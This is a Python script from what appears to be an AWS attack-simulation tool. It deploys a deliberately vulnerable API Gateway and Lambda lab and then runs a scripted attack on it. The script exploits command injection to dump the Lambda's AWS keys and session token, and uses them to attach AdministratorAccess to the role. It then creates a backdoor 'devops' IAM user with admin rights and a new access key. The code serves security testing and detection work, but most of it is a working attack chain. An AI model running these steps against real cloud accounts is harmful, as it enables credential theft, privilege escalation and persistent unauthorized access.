import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from .report.report import gen_report_2



def scenario_2_execute():
    print("-"*30)
    print(colored("Executing Scenraio 2 : Rest API exploit - command injection, credential exfiltration from backend lambda and privilege escalation, rogue identity creation & persistence", color="red"))

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)

    file_path = "./core/aws-scenario-2-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))

    try:
        subprocess.run("cd ./scenarios/scenario_2/infra/ && pulumi up -s aws-scenario-2 --yes ", shell=True, check=True)
    except Exception as e:
        print(colored("Credentials are missing", color="red"))
        raise

    subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi stack -s aws-scenario-2 output --json >> ../../../core/aws-scenario-2-output.json", shell=True)

    with open("./core/aws-scenario-2-output.json", "r") as file:
        data = json.load(file)

    API_GW_URL = data["apigateway-rest-endpoint"]
    LAMBDA_ROLE_NAME = data["lambda-role-name"]
    API_GW_ID = data["api-gateway-id"]
    LAMBDA_FUNC_ARN = data["lambda-func-name"]

    print(colored("Exploiting the Application on API GW", color="red"))
    loading_animation()
    print("-"*30)   

    print(colored("Detected OS Injection through API GW, lambda backend, attempting credential exfil", color="red"))
    loading_animation()
    print("-"*30)   

    subprocess.call("curl '"+API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN > token.txt", shell=True)

    print(colored("Successfully Exifiltrated Lambda Role Credentials", color="red"))
    loading_animation()
    print("-"*30)   


    # Step 2: Read the contents
    with open('token.txt', 'r') as file:
    # Read the first three lines
        file_contents = [file.readline() for _ in range(2)]
    file.close()
    subprocess.call("rm token.txt", shell=True)

    # Step 3: Parse the contents to extract key-value pair
    credentials = ""
    for line in file_contents:
        #key = line.strip().split('=')[0].strip()
        #value = line.strip().split('=')[1].strip()
        credentials = credentials+line.strip()+" "

    subprocess.call(""+credentials+" && aws sts get-caller-identity --no-cli-pager", shell=True)
    
    print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
    subprocess.run(""+credentials+" && aws --no-cli-pager iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME, shell=True)

    subprocess.run(f"pulumi -C scenarios/scenario_2/infra/ import aws:iam/rolePolicyAttachment:RolePolicyAttachment lambdaRolePolicyAdmin {LAMBDA_ROLE_NAME.strip()}/arn:aws:iam::aws:policy/AdministratorAccess --protect=false --yes --stack=aws-scenario-2 --suppress-outputs --suppress-progress > /dev/null 2>&1", shell=True)

    sleep_duration = 20
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        # Loop until sleep_duration is reached
        while sleep_duration > 0:
            # Sleep for a shorter interval to update the progress bar
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            # Update the progress bar with the elapsed time
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    #Backdoor IAM User
    print(colored("Creating a Backdoor User which can be used by the attacker", color="red"))
    loading_animation()
    print("-"*30)

    subprocess.call(""+credentials+" && aws iam create-user --user-name devops --no-cli-pager", shell=True)
    subprocess.call(""+credentials+" && aws iam attach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
    result = subprocess.run(""+credentials+" && aws iam create-access-key --user-name devops --no-cli-pager", shell=True, capture_output=True, text=True)

    DEVOPS_ACCESSKEY = json.loads(result.stdout)['AccessKey']['AccessKeyId']
    

    subprocess.run(f"pulumi -C scenarios/scenario_2/infra/ import aws:iam/user:User devopsUser devops --protect=false --yes --stack=aws-scenario-2 --suppress-outputs --suppress-progress > /dev/null 2>&1", shell=True)

    subprocess.run(f"pulumi -C scenarios/scenario_2/infra/ import aws:iam/userPolicyAttachment:UserPolicyAttachment devopsUserPolicyAdmin devops/arn:aws:iam::aws:policy/AdministratorAccess --protect=false --yes --stack=aws-scenario-2 --suppress-outputs --suppress-progress  > /dev/null 2>&1", shell=True)

    subprocess.run(f"pulumi -C scenarios/scenario_2/infra/ import aws:iam/accessKey:AccessKey devopsAccessKey {DEVOPS_ACCESSKEY} --parent urn:pulumi:aws-scenario-2::infra::aws:iam/user:User::devopsUser --protect=false --yes --stack=aws-scenario-2 --suppress-outputs --suppress-progress  > /dev/null 2>&1", shell=True)


    gen_report_2(API_GW_ID, LAMBDA_FUNC_ARN, API_GW_URL, LAMBDA_ROLE_NAME)

